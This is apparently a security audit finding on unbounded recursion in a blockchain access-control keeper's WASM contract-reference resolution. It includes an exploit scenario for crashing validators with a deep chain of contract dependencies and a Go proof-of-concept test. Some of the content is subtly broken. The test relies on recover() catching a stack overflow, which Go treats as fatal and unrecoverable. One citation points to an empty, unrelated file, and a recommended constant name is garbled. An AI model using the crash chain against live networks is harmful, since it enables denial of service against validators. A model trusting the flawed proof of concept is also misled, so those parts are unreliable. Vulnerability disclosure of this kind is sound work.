## Title
Unbounded Recursion in WASM Contract Reference Resolution Enables Validator Node Crash

## Summary
The `ImportContractReferences` function in `x/accesscontrol/keeper/keeper.go` lacks a maximum recursion depth limit, allowing an attacker to create a deep chain of WASM contract dependencies that causes stack overflow and crashes validator nodes when processing transactions. [1](#0-0) 

## Impact
**High**

## Finding Description

**Location:** 
- `x/accesscontrol/keeper/keeper.go`, function `ImportContractReferences` (lines 252-309)
- `x/accesscontrol/keeper/keeper.go`, function `GetWasmDependencyAccessOps` (lines 160-224) [2](#0-1) 

**Intended Logic:** 
The code is designed to recursively resolve WASM contract dependencies for access control optimization. It uses a `circularDepLookup` map to detect and prevent circular dependencies where the same (contract, messageType, messageName) tuple is encountered twice. [3](#0-2) 

**Actual Logic:** 
The circular dependency detection only prevents infinite loops where the exact same contract+message combination is revisited. However, there is no maximum recursion depth limit. A malicious actor can create a deep chain where each contract references a different contract with a different message name (e.g., Contract A(msg_a) → Contract B(msg_b) → Contract C(msg_c) → ... → Contract Z(msg_z) → Contract AA(msg_aa) → ...). Since each tuple is unique, the circular dependency check never triggers, and the recursion continues until stack exhaustion. [4](#0-3) 

**Exploit Scenario:**
1. Attacker deploys a chain of N WASM contracts (N ≥ 1000-10000 depending on system stack size)
2. Each contract i has a dependency mapping with a BaseContractReference pointing to contract i+1 with a unique message name
3. Any user executes contract 0 with a transaction
4. Validator nodes process the transaction and call `GetWasmDependencyAccessOps` for contract 0
5. This recursively calls `ImportContractReferences` and then `GetWasmDependencyAccessOps` for each subsequent contract in the chain
6. After N recursive calls, the Go runtime stack overflows, causing a runtime panic
7. The validator node crashes and must restart

**Security Failure:** 
This breaks the availability and liveness guarantees of the blockchain. A denial-of-service vulnerability allows any unprivileged attacker to crash validator nodes by submitting transactions that trigger deep dependency resolution.

## Impact Explanation

**Affected Components:**
- Validator nodes processing WASM contract transactions
- Network availability and transaction finality
- Consensus participation

**Severity:**
- Any validator that processes the malicious transaction will crash with a stack overflow panic
- The attacker can repeatedly submit such transactions to keep validators offline
- If enough validators are affected (≥30%), block production could be significantly delayed
- Network may become unable to confirm new transactions if sufficient validators are offline simultaneously
- Recovery requires node operators to manually restart crashed validators

**System Impact:**
This directly affects the reliability and availability of the blockchain network, potentially causing temporary network halt or significant degradation if exploited systematically against multiple validators.

## Likelihood Explanation

**Who Can Trigger:** Any user who can deploy WASM contracts and set dependency mappings can create the malicious chain. Any other user who executes a transaction calling the first contract in the chain will trigger the attack.

**Conditions Required:**
- Attacker deploys a chain of contracts with deep dependency references
- Any user (including the attacker) submits a transaction executing the root contract
- Validators process the transaction and attempt to resolve dependencies

**Frequency:** 
- Can be triggered at will by the attacker with every transaction execution
- Relatively easy to exploit as it only requires deploying contracts and submitting transactions
- High likelihood of exploitation once discovered by malicious actors

## Recommendation

Implement a maximum recursion depth limit for contract reference resolution, similar to other depth limits in the codebase:

1. Add a constant defining maximum dependency depth (e.g., `MaxContractReferenceDe depth = 32` or `64`)
2. Pass a depth counter parameter through `GetWasmDependencyAccessOps` and `ImportContractReferences`
3. Increment the depth counter on each recursive call
4. Return synchronous access operations when depth limit is exceeded, similar to circular dependency handling
5. Log a warning when depth limit is reached to alert operators

Example implementation pattern (similar to protobuf depth limits in the codebase): [5](#0-4) 

## Proof of Concept

**File:** `x/accesscontrol/keeper/keeper_test.go`

**Test Function:** `TestDeepContractReferenceChainStackOverflow`

**Setup:**
1. Initialize test app and context using `simapp.Setup(false)`
2. Create N contract addresses (where N = 1000 or more, depending on available stack space)
3. For each contract i (where 0 ≤ i < N-1):
   - Create a `WasmDependencyMapping` with:
     - `BaseContractReferences` pointing to contract i+1
     - Unique message name for contract i+1 (e.g., `fmt.Sprintf("msg_%d", i+1)`)
     - `BaseAccessOps` with a simple COMMIT operation
   - Call `SetWasmDependencyMapping` to store the mapping
4. For the last contract N-1, create a mapping with no further references

**Trigger:**
1. Create an execute message info for contract 0 with message name "msg_0"
2. Call `GetWasmDependencyAccessOps(ctx, contractAddress[0], senderAddr, msgInfo, make(ContractReferenceLookupMap))`
3. This will recursively resolve all N contracts in the chain

**Observation:**
- With N ≥ 1000-10000 (system-dependent), the test will panic with "runtime: goroutine stack exceeds limit" or similar stack overflow error
- The panic proves that unbounded recursion causes validator node crashes
- The test should be wrapped in a recover() block to catch and verify the panic:

```go
func TestDeepContractReferenceChainStackOverflow(t *testing.T) {
    app := simapp.Setup(false)
    ctx := app.BaseApp.NewContext(false, tmproto.Header{})
    
    // Create deep chain (adjust N based on system)
    N := 5000
    contracts := simapp.AddTestAddrsIncremental(app, ctx, N, sdk.NewInt(30000000))
    
    // Set up chain of dependencies
    for i := 0; i < N-1; i++ {
        mapping := acltypes.WasmDependencyMapping{
            BaseAccessOps: []*acltypes.WasmAccessOperation{
                {
                    Operation: types.CommitAccessOp(),
                    SelectorType: acltypes.AccessOperationSelectorType_NONE,
                },
            },
            BaseContractReferences: []*acltypes.WasmContractReference{
                {
                    ContractAddress: contracts[i+1].String(),
                    MessageType: acltypes.WasmMessageSubtype_EXECUTE,
                    MessageName: fmt.Sprintf("msg_%d", i+1),
                    JsonTranslationTemplate: fmt.Sprintf("{\"msg_%d\":{}}", i+1),
                },
            },
            ContractAddress: contracts[i].String(),
        }
        err := app.AccessControlKeeper.SetWasmDependencyMapping(ctx, mapping)
        require.NoError(t, err)
    }
    
    // Last contract has no references
    lastMapping := acltypes.WasmDependencyMapping{
        BaseAccessOps: []*acltypes.WasmAccessOperation{
            {
                Operation: types.CommitAccessOp(),
                SelectorType: acltypes.AccessOperationSelectorType_NONE,
            },
        },
        ContractAddress: contracts[N-1].String(),
    }
    err := app.AccessControlKeeper.SetWasmDependencyMapping(ctx, lastMapping)
    require.NoError(t, err)
    
    // Trigger deep recursion
    msgInfo, _ := types.NewExecuteMessageInfo([]byte("{\"msg_0\":{}}"))
    
    // This should panic with stack overflow
    defer func() {
        if r := recover(); r != nil {
            t.Logf("Caught panic as expected: %v", r)
            // Verify it's a stack overflow
            require.Contains(t, fmt.Sprintf("%v", r), "stack")
        } else {
            t.Fatal("Expected stack overflow panic but didn't occur")
        }
    }()
    
    _, err = app.AccessControlKeeper.GetWasmDependencyAccessOps(
        ctx,
        contracts[0],
        contracts[0].String(),
        msgInfo,
        make(aclkeeper.ContractReferenceLookupMap),
    )
}
```

The test demonstrates that with a sufficiently deep chain (N ≥ 1000-10000), the recursive resolution causes a stack overflow panic, crashing the validator node.

### Citations

**File:** x/accesscontrol/keeper/keeper.go (L140-144)
```go
func GetCircularDependencyIdentifier(contractAddr sdk.AccAddress, msgInfo *types.WasmMessageInfo) string {
	separator := ";"
	identifier := contractAddr.String() + separator + msgInfo.MessageType.String() + separator + msgInfo.MessageName
	return identifier
}
```

**File:** x/accesscontrol/keeper/keeper.go (L160-168)
```go
func (k Keeper) GetWasmDependencyAccessOps(ctx sdk.Context, contractAddress sdk.AccAddress, senderBech string, msgInfo *types.WasmMessageInfo, circularDepLookup ContractReferenceLookupMap) ([]acltypes.AccessOperation, error) {
	uniqueIdentifier := GetCircularDependencyIdentifier(contractAddress, msgInfo)
	if _, ok := circularDepLookup[uniqueIdentifier]; ok {
		// we've already seen this identifier, we should simply return synchronous access Ops
		ctx.Logger().Error("Circular dependency encountered, using synchronous access ops instead")
		return types.SynchronousAccessOps(), nil
	}
	// add to our lookup so we know we've seen this identifier
	circularDepLookup[uniqueIdentifier] = struct{}{}
```

**File:** x/accesscontrol/keeper/keeper.go (L252-309)
```go
func (k Keeper) ImportContractReferences(
	ctx sdk.Context,
	contractAddr sdk.AccAddress,
	contractReferences []*acltypes.WasmContractReference,
	senderBech string,
	msgInfo *types.WasmMessageInfo,
	circularDepLookup ContractReferenceLookupMap,
) (*types.AccessOperationSet, error) {
	importedAccessOps := types.NewEmptyAccessOperationSet()

	jsonTranslator := types.NewWasmMessageTranslator(senderBech, contractAddr.String(), msgInfo)

	// msgInfo can't be nil, it will panic
	if msgInfo == nil {
		return nil, sdkerrors.Wrap(types.ErrInvalidMsgInfo, "msgInfo cannot be nil")
	}

	for _, contractReference := range contractReferences {
		parsedContractReferenceAddress := ParseContractReferenceAddress(contractReference.ContractAddress, senderBech, msgInfo)
		// if parsing failed and contractAddress is invalid, this step will error and indicate invalid address
		importContractAddress, err := sdk.AccAddressFromBech32(parsedContractReferenceAddress)
		if err != nil {
			return nil, err
		}
		newJson, err := jsonTranslator.TranslateMessageBody([]byte(contractReference.JsonTranslationTemplate))
		if err != nil {
			// if there's a problem translating, log it and then pass in empty json
			ctx.Logger().Error("Error translating JSON body", err)
			newJson = []byte(fmt.Sprintf("{\"%s\":{}}", contractReference.MessageName))
		}
		var msgInfo *types.WasmMessageInfo
		if contractReference.MessageType == acltypes.WasmMessageSubtype_EXECUTE {
			msgInfo, err = types.NewExecuteMessageInfo(newJson)
			if err != nil {
				return nil, err
			}
		} else if contractReference.MessageType == acltypes.WasmMessageSubtype_QUERY {
			msgInfo, err = types.NewQueryMessageInfo(newJson)
			if err != nil {
				return nil, err
			}
		}
		// We use this to import the dependencies from another contract address
		wasmDeps, err := k.GetWasmDependencyAccessOps(ctx, importContractAddress, contractAddr.String(), msgInfo, circularDepLookup)

		if err != nil {
			// if we have an error fetching the dependency mapping or the mapping is disabled,
			// we want to return the error and the fallback behavior can be defined in the caller function
			// recommended fallback behavior is to use synchronous wasm access ops
			return nil, err
		} else {
			// if we did get deps properly and they are enabled, now we want to add them to our access operations
			importedAccessOps.AddMultiple(wasmDeps)
		}
	}
	// if we imported all relevant contract references properly, we can return the access ops generated
	return importedAccessOps, nil
}
```

**File:** codec/types/interface_registry.go (L0-0)
```go

```
